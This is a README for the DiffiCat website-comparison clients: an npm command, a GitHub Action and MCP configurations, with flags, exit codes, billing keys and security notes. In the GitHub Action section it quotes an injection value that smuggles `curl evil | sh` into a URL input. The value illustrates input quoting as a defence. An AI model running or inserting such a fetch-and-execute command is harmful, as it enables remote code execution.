# DiffiCat clients

[DiffiCat](https://difficat.com) compares a source website against a target website on three checks: page existence, content and visual regression. This repository holds the ways to run it from a shell, a pipeline or an AI agent:

- the `difficat` command on npm,
- the `difficat/difficat` GitHub Action,
- MCP client configurations for Claude Code, Cursor, VS Code and Claude Desktop.

The comparison itself runs on DiffiCat's service through its [public API](https://app.difficat.com/api/v1/openapi.json). Nothing here runs a browser on your machine.

## The command

No install, no account:

```sh
npx difficat compare https://old.difficat.com https://new.difficat.com --max-pages 50
```

It starts a comparison, waits for it and prints a one-line verdict, the failed pages worst first with their failed checks and top issue, and the job id:

```
2 of 3 pages failed, 1 passed; issues: 1 critical, 1 high, 1 medium
FAIL https://old.difficat.com/team.html [existence] critical: Site B returned 404 Not Found
FAIL https://old.difficat.com/pricing.html [content, visual] high: Visual difference of 3.55%
Job: web-c027fd3e-defb-46a7-96d5-e393fc1fe230
```

| Flag | Meaning |
|---|---|
| `--pairs <file>` | a JSON array of `{ "source", "target" }` page pairs instead of two sites |
| `--max-pages <n>` | ceiling on the pages compared (default 50 for a site pair; a pairs file is never capped) |
| `--min-pages <n>` | fewer compared pages is an error (default 1) |
| `--max-price <usd>` | refuse a job priced above this amount before anything is charged |
| `--width <px>` | viewport width, 320 to 2560 |
| `--threshold <0-1>` | visual diff tolerance as a fraction |
| `--fail-on <mode>` | `failed` (any failed check, the default), `broken` (existence failures only) or `none` |
| `--wait <seconds>` | give up waiting after this long (default 1800) |
| `--dry-run` | print the quoted page count and amount, start nothing |
| `--report <file>` | save the full report, every page, as JSON |
| `--json` | print the digest JSON on stdout, the verdict on stderr |
| `--api <origin>` | another API origin (printed whenever it is not the default) |

Exit codes: **0** every page passed, **1** a page failed under `--fail-on`, **2** payment required, **3** error (invalid input, a failed or cancelled job, a timeout, fewer than `--min-pages` pages compared).

Two more commands wrap the other routes:

```sh
npx difficat discover https://old.difficat.com --target https://new.difficat.com
npx difficat screenshot https://new.difficat.com --width 375 --out home.png
```

### Keys and the allowance

Without a key the daily allowance of the calling address applies (40 comparison pages a day, see [difficat.com/agents](https://difficat.com/agents)). When it is used up the command prints the price and the ways to pay, and exits 2. It never pays a wallet challenge itself.

A prepaid or Pro key removes the limit:

```sh
export DIFFICAT_KEY=dck_...
npx difficat compare https://old.difficat.com https://new.difficat.com
```

**A key bills every run.** Keys come from the [prepaid page](https://app.difficat.com/prepaid) or a Pro account. Prefer the environment variable over `--key`, which lands in shell history.

### What the command never prints

- The `jobToken` the API issues for reading a job. It is used for the status, report and file reads and appears in no output, log, summary or artifact.
- A report URL: the report needs the token, so the command prints the job id and, with `--report`, the saved file's path.
- Raw page text: every site-derived string has control characters and a leading `::` escaped, so a hostile page cannot emit a workflow command through the output.

### Preview URLs must be public

The service refuses private, loopback and unresolvable hosts (`localhost`, `10.x`, `*.internal`). A preview deployment behind HTTP basic auth is fine; one on a private network is not.

## The GitHub Action

Gate a pull request on a comparison of production against the preview deployment:

```yaml
- uses: difficat/difficat@v1
  with:
    source: https://www.your-site.test
    target: ${{ steps.preview.outputs.url }}
    max-pages: 50
    key: ${{ secrets.DIFFICAT_KEY }}
```

The step fails when a page fails. The job summary shows the verdict and the failed pages; the full report is the `difficat-report` artifact of the run. A complete workflow is in [`examples/preview-gate.yml`](examples/preview-gate.yml).

| Input | Default | Meaning |
|---|---|---|
| `source` | | Site A, the reference site |
| `target` | | Site B, the site under test |
| `pairs` | | path to a JSON pairs file, instead of `source` and `target` |
| `max-pages` | | passed to the CLI only when set |
| `min-pages` | `1` | fewer compared pages exits 3 |
| `max-price` | | spend cap in USD |
| `key` | | a prepaid or Pro key, from a secret; every keyed run is billed |
| `fail-on` | `failed` | `failed`, `broken` or `none` |
| `width` | | viewport width in px |
| `threshold` | | visual tolerance, 0 to 1 |
| `version` | the pinned release | the exact `difficat` version to run |

Outputs: `exit-code` (0, 1, 2 or 3) and `job-id`.

How it behaves:

- **A key is recommended.** GitHub-hosted runners share their addresses with every GitHub user, so the keyless allowance may already be used up when your job runs. Store the key as a repository secret and pass it through `key`; the action masks it and never writes it to the summary, the log or the artifact.
- **Fork pull requests skip.** A pull request from a fork has no secrets. With no key on such an event the action posts a notice and exits 0 rather than failing a contributor's build with a payment refusal.
- **A failed gate keeps its report.** The compare step captures the exit code; the summary and the artifact upload run `if: always()`, and the last step exits with the captured code. A missing report is reported as an infrastructure error, never as page failures.
- **Inputs never reach a shell unquoted.** Every input is an environment variable quoted in the script, with `--` before the positionals, so `https://x.example; curl evil | sh` is one argument the CLI refuses as an invalid URL.
- **Pinned.** The action runs `npx -y difficat@<exact version>`; each DiffiCat release moves the `v1` tag with the pin. Set `version` to hold or roll back.

## MCP setup

DiffiCat's MCP server is a stateless Streamable HTTP endpoint at `https://app.difficat.com/mcp`. The same allowance and keys apply; a key is sent once as a header on the client, never as a tool argument.

| Client | Configuration |
|---|---|
| Claude Code | [`examples/mcp-claude-code.sh`](examples/mcp-claude-code.sh) |
| Cursor | [`examples/mcp-cursor.json`](examples/mcp-cursor.json) as `.cursor/mcp.json` |
| VS Code | [`examples/mcp-vscode.json`](examples/mcp-vscode.json) as `.vscode/mcp.json` |
| Claude Desktop | [`examples/mcp-claude-desktop.json`](examples/mcp-claude-desktop.json) in `claude_desktop_config.json`, or add `https://app.difficat.com/mcp` as a custom connector under Settings |

The tools, prices and a first call are documented at [difficat.com/agents](https://difficat.com/agents); the machine-readable version is [llms.txt](https://difficat.com/llms.txt).

## License

The clients in this repository are MIT licensed (see [LICENSE](LICENSE)). The DiffiCat service and its comparison engine are proprietary and are not part of this repository.
